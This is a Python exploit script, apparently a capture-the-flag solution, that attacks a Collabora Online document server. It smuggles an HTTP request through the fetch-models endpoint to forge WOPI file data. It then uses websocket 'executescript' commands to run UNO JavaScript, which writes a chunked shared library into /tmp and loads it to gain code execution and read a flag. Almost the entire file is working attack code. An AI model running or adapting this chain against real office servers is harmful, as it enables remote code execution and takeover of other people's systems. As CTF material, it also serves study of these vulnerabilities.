#!/usr/bin/env python3
import base64
import json
import sys
import time
import urllib.parse
import uuid

import websocket

MAGIC_SVC = "http://localhost:9980"  # Collabora с точки зрения её самой (loopback в KIT allowlist)


def q(value):
    return json.dumps(value, separators=(",", ":"))


def build_wopi_url(portal, wopi_host):
    """Шаги 1-2: URL fetch-models с упакованным smuggling-запросом.

    WOPISrc должен резолвиться изнутри collabora (это webapp:8000),
    а origin smuggling-запроса — loopback самого collabora (localhost:9980),
    т.к. fetch-models KIT-allowlist пропускает только localhost.
    """
    info = json.dumps(
        {
            "BaseFileName": "poc.txt",
            "Size": 0,
            "OwnerId": "poc",
            "UserId": "poc",
            "UserFriendlyName": "poc",
            "UserCanWrite": True,
            "IsAnonymousUser": True,
            "FileUrl": MAGIC_SVC + "/robots.txt",
        },
        separators=(",", ":"),
    )
    boundary = "----collabora-root-poc"
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="data"; filename="poc.txt"\r\n'
        "Content-Type: text/plain\r\n\r\n"
        f"{info}\r\n--{boundary}--\r\n"
    )
    smuggled = (
        f"{MAGIC_SVC}/cool/render-search-result?silent= HTTP/1.1\r\n"
        f"Host: {MAGIC_SVC.split('//')[1]}\r\nContent-Length: 0\r\n\r\n"
        "POST /cool/convert-to/txt HTTP/1.1\r\n"
        f"Host: {MAGIC_SVC.split('//')[1]}\r\n"
        f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
        f"Content-Length: {len(body.encode())}\r\n"
        f"Connection: close\r\n\r\n{body}"
    )
    query = urllib.parse.urlencode(
        {"provider": "custom", "baseUrl": smuggled, "apiKey": "poc"}
    )
    return f"http://{wopi_host}/browser/dist/fetch-models?" + query


def receive(ws, timeout=60):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        try:
            message = ws.recv()
        except websocket.WebSocketTimeoutException:
            continue
        if isinstance(message, str):
            return message
    raise TimeoutError("ws recv timeout")


def wait_prefix(ws, prefix, timeout=60):
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        message = receive(ws, max(1, end - time.monotonic()))
        if message.startswith("error:"):
            raise RuntimeError(message)
        if message.startswith(prefix):
            return message
    raise TimeoutError(f"waiting for {prefix}")


def execute(ws, name, script, timeout=60):
    ws.send(f"executescript {name} {script}")
    end = time.monotonic() + timeout
    while time.monotonic() < end:
        message = receive(ws, max(1, end - time.monotonic()))
        if message.startswith("error:"):
            raise RuntimeError(message)
        if not message.startswith("executescriptresult: "):
            continue
        data = json.loads(message.split(": ", 1)[1])
        if data.get("id") == name:
            return data.get("ok", "")
    raise TimeoutError(name)


DECODER = r"""
const A='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
function d64(s){const o=[];for(let i=0;i<s.length;i+=4){const a=A.indexOf(s[i]),b=A.indexOf(s[i+1]),c=s[i+2]==='='?-1:A.indexOf(s[i+2]),d=s[i+3]==='='?-1:A.indexOf(s[i+3]);let v=(a<<2)|(b>>4);o.push(v<128?v:v-256);if(c>=0){v=((b&15)<<4)|(c>>2);o.push(v<128?v:v-256)}if(d>=0){v=((c&3)<<6)|d;o.push(v<128?v:v-256)}}return o}
""".strip()


def init_script(paths, final, registry, marker):
    return (
        (
            "(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),"
            "p=PATHS.concat([FINAL,REG,MARK]);for(const x of p)try{if(s.exists(x))s.kill(x)}catch(e){}return 'OK'})()"
        )
        .replace("PATHS", q(paths))
        .replace("FINAL", q(final))
        .replace("REG", q(registry))
        .replace("MARK", q(marker))
    )


def chunk_script(path, data):
    encoded = base64.b64encode(data).decode()
    return (
        (
            "(()=>{DEC;const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),"
            "o=s.openFileWrite(PATH),b=d64(DATA);o.writeBytes(b);o.closeOutput();return String(b.length)})()"
        )
        .replace("DEC", DECODER)
        .replace("PATH", q(path))
        .replace("DATA", q(encoded))
    )


def assemble_script(paths, final):
    return (
        (
            "(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext),"
            "o=s.openFileWrite(FINAL);let n=0;for(const p of PATHS){const i=s.openFileRead(p),h={};"
            "i.readBytes(h,30000);i.closeInput();const b=Array.isArray(h.val)?h.val:[];"
            "o.writeBytes(b);n+=b.length;s.kill(p)}o.closeOutput();return String(n)})()"
        )
        .replace("PATHS", q(paths))
        .replace("FINAL", q(final))
    )


def load_script(final, registry, marker):
    return (
        (
            "(()=>{const s=uno.idl.com.sun.star.ucb.SimpleFileAccess.create(uno.componentContext);"
            "let r=null,t='';try{r=uno.idl.com.sun.star.registry.SimpleRegistry.create(uno.componentContext);"
            "r.open(REG,false,true);const l=uno.idl.com.sun.star.loader.SharedLibrary.create(uno.componentContext);"
            "l.writeRegistryInfo(r.getRootKey(),'',SO)}catch(e){t='load: '+String(e)}"
            "try{const i=s.openFileRead(MARK),h={};i.readBytes(h,4096);i.closeInput();"
            "const b=Array.isArray(h.val)?h.val:[];"
            "t=b.map(v=>String.fromCharCode(v<0?v+256:v)).join('')}catch(e){}"
            "try{if(r&&r.isValid())r.destroy()}catch(e){}"
            "for(const p of [REG,MARK,SO])try{if(s.exists(p))s.kill(p)}catch(e){}return t})()"
        )
        .replace("SO", q(final))
        .replace("REG", q(registry))
        .replace("MARK", q(marker))
    )


def main():
    portal = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000"
    payload_path = sys.argv[2] if len(sys.argv) > 2 else "solve/payload.so"
    portal = portal if "://" in portal else "http://" + portal
    parsed = urllib.parse.urlsplit(portal)
    ws_host = parsed.netloc
    wopi_host = (
        parsed.hostname.replace("localhost", "webapp") + ":8000"
        if parsed.port in (None, 80)
        else parsed.hostname.replace("localhost", "webapp") + f":{parsed.port}"
    )

    source = build_wopi_url(portal, wopi_host)
    double = urllib.parse.quote(urllib.parse.quote(source, safe=""), safe="")
    ws_url = (
        "ws://"
        + ws_host
        + "/cool/ws?WOPISrc="
        + double
        + "&access_token=poc&permission=edit"
    )

    data = open(payload_path, "rb").read()
    chunks = [data[i : i + 28000] for i in range(0, len(data), 28000)]
    nonce = uuid.uuid4().hex
    prefix = f"file:///tmp/solve-{nonce}"
    paths = [f"{prefix}-{i}" for i in range(len(chunks))]
    final = prefix + ".so"
    registry = prefix + ".rdb"
    marker = "file:///tmp/solve-flag.txt"

    ws = websocket.create_connection(
        ws_url, timeout=10, origin=portal, redirect_limit=0
    )
    ws.settimeout(0.5)
    try:
        wait_prefix(ws, "progress:", 20)
        ws.send("coolclient 0.1")
        ws.send("load url=" + urllib.parse.quote(source, safe=""))
        wait_prefix(ws, "loaded:", 40)
        print("[+] document loaded (smuggled WOPI accepted)")
        execute(ws, "init", init_script(paths, final, registry, marker))
        for i, chunk in enumerate(chunks):
            execute(ws, f"chunk-{i}", chunk_script(paths[i], chunk))
        execute(ws, "assemble", assemble_script(paths, final))
        print("[+] payload assembled in jail, triggering dlopen")
        answer = execute(ws, "rce", load_script(final, registry, marker), 40)
        print("[FLAG]:", answer.strip())
        return 0 if "ctfcup{" in answer or "FLAG" in answer.upper() else 1
    finally:
        ws.close()


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except SystemExit:
        raise
    except Exception as error:
        print("Ошибка:", error)
        raise SystemExit(1)
